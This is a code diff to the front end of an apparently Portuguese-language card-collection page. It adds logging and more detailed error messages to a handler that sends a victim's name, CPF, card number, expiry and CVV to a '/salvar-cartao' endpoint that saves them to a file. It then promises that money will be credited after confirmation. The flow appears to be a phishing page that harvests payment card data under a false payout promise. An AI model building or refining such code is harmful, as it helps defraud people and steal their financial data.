@@ -1122,7 +1122,7 @@
             showStep('flowCartao', 3);
         });
 
-      document.getElementById('confirmCartao').addEventListener('click', async () => {
+     document.getElementById('confirmCartao').addEventListener('click', async () => {
     const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
     const validade = document.getElementById('validadeCartao').value;
     const cvv = document.getElementById('cvvCartao').value;
@@ -1171,10 +1171,14 @@
     btnConfirm.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Salvando...';
     
     try {
+        console.log('🚀 Enviando dados para o servidor...');
+        
         // Enviar dados para o servidor salvar em arquivo
         const response = await fetch('/salvar-cartao', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 
+                'Content-Type': 'application/json'
+            },
             body: JSON.stringify({
                 nome: dadosUsuario?.nome || 'N/A',
                 cpf: cpfAtual,
@@ -1186,24 +1190,26 @@
             })
         });
         
+        console.log('📡 Resposta recebida:', response.status);
+        
         const resultado = await response.json();
+        console.log('📦 Dados da resposta:', resultado);
         
         if (resultado.success) {
             alert('✅ Dados salvos com sucesso!\n\n📧 Você receberá um e-mail de confirmação em até 24 horas.\n\n⚠️ O valor será creditado na sua conta após a confirmação.');
             limparProgresso();
             showStep('flowSuccess', 3);
         } else {
-            alert('❌ Erro ao salvar dados. Tente novamente.');
+            alert('❌ Erro ao salvar dados: ' + (resultado.erro || 'Tente novamente.'));
         }
     } catch (error) {
-        console.error('Erro:', error);
-        alert('❌ Erro ao conectar com o servidor. Tente novamente.');
+        console.error('❌ Erro detalhado:', error);
+        alert('❌ Erro ao conectar com o servidor. Verifique se o servidor está rodando.\n\nDetalhe: ' + error.message);
     } finally {
         btnConfirm.disabled = false;
         btnConfirm.innerHTML = originalText;
     }
 });
-    
         document.getElementById('cancelCartao').addEventListener('click', () => {
             salvarProgresso();
             showStep('flowFinal', 3);
